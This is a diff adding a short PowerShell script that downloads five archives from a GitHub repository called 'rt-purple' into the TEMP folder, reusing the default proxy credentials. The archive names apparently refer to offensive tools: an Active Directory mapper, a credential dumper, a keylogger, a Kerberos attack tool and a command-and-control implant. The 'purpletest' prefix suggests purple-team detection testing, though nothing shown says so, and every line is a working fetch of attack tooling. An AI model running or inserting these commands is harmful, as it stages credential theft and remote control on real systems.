@@ -1,0 +1,5 @@
+$w=new-object net.webclient;$w.Proxy.Credentials=[net.credentialcache]::DefaultCredentials;Invoke-WebRequest -Uri "https://github.com/rt-purple/public/raw/refs/heads/main/purpletest_ShrpHnd.7z" -OutFile "$env:TEMP\purpletest_ShrpHnd.7z";
+Invoke-WebRequest -Uri "https://github.com/rt-purple/public/raw/refs/heads/main/purpletest_LZgn.7z" -OutFile "$env:TEMP\purpletest_LZgn.7z";
+Invoke-WebRequest -Uri "https://github.com/rt-purple/public/raw/refs/heads/main/purpletest_klggr.7z" -OutFile "$env:TEMP\purpletest_klggr.7z";
+Invoke-WebRequest -Uri "https://github.com/rt-purple/public/raw/refs/heads/main/purpletest_Rbs.7z" -OutFile "$env:TEMP\purpletest_Rbs.7z";
+Invoke-WebRequest -Uri "https://github.com/rt-purple/public/raw/refs/heads/main/purpletest_slvr.7z" -OutFile "$env:TEMP\purpletest_slvr.7z";
